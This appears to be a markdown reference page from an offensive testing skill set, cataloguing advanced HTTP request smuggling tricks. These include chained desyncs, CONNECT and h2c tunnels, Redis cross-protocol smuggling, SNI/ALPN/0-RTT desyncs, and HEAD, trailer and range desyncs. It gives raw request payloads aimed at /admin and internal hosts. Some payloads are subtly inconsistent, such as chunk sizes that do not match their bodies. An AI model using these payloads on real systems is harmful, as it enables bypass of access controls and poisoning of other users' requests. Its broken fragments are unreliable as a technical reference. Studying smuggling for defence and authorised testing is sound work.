# Advanced reach — the last-mile tricks

## The double-smuggle — two desyncs chained

```text
POST / [desync 1: GET /internal] + [desync 2: GET /admin]
```

Two desyncs on the same connection — the first poisons the queue, the
second lands behind it — the chain of poisons.

## The smuggle-inside-smuggle — the nested tunnel

```text
CONNECT internal:80 → GET /ws → Upgrade: websocket → HTTP inside frame
```

A CONNECT tunnel carrying an upgrade — the smuggle three layers deep —
`tunneling.md`.

## The cross-protocol smuggle — HTTP inside Redis/memcached

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
SET k v\r\nGET k\r\n
0
```

The smuggle lands on a Redis-protocol socket — the bytes are Redis
commands — a protocol-crossing smuggle — `skills/web-ssrf/references/protocol-smuggling.md`.

## The TLS-ALPN smuggle — the h2-vs-h1 ALPN

```text
ALPN: h2
```

The ALPN negotiation determines the protocol — a client forcing `h2`
when the back expects `h1` — the version-desync — `protocol-version.md`.

## The SNI-smuggle — `SNI: internal`

```text
TLS SNI: internal.local
```

The TLS SNI routes the connection — a proxy honoring the SNI vs the
`Host:` header — a TLS-layer smuggle.

## The early-data / 0-RTT smuggle — the replay

```text
TLS 1.3 early-data: GET /admin
```

0-RTT early-data — a front-end that replays it vs one that rejects —
the replay-desync.

## The trailer-smuggle — `Trailer:` headers after the body

```text
POST / HTTP/1.1
Transfer-Encoding: chunked
Trailer: X-Smuggle

5c
<data>
0
X-Smuggle: value
```

The trailer headers — `extended-corpus.md` — a parser that reads them
vs one that drops them.

## The `Content-Encoding` boundary — gzip + chunked

```text
Content-Encoding: gzip
Transfer-Encoding: chunked
```

A gzip-body inside chunks — a front-end that de-chunks then
re-compresses — the compression-boundary desync.

## The `Upgrade: h2c` + `CONNECT` — the h2c tunnel

```text
CONNECT internal:80 + Upgrade: h2c inside the tunnel
```

`tunneling.md` + `upgrade-smuggling.md` — the nested upgrade.

## The desync-on-HEAD — `HEAD` ignoring the body

```text
HEAD / HTTP/1.1
Content-Length: 45

GET /admin HTTP/1.1
```

`HEAD` never has a body — the `GET /admin` is the next request — CL.0
— `client-side-desync.md`.

## The range-smuggle — `Range: bytes=X-Y` boundary

```text
GET /file HTTP/1.1
Range: bytes=0-100
Content-Length: 4

A=1&
```

The range-parser's body-disagreement.

## The keep-alive-timeout — the slow-drain

A smuggle that lands on a slow-draining keep-alive — the poison waits
for the next request — a delayed-queue — `second-order.md`.
